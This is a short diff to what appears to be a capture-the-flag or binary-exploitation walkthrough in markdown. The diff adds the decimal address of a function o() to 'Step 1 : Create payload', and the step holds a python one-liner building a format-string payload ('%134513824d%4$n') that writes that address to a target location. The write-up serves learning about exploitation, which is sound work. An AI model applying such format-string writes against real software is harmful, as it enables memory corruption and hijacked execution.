@@ -43,6 +43,8 @@ aaaa 200 b7fd1ac0 b7ff37d0 61616161 20782520
 ### Step 1 : Create payload
 
 The address `08049838` it convert in little-endian format `'\x38\x98\x04\x08'`
+`o()` address in decimal  `134513824`
+
 ```
 python -c 'print "\x38\x98\x04\x08" + "%134513824d%4$n"' > /tmp/payload
 ```
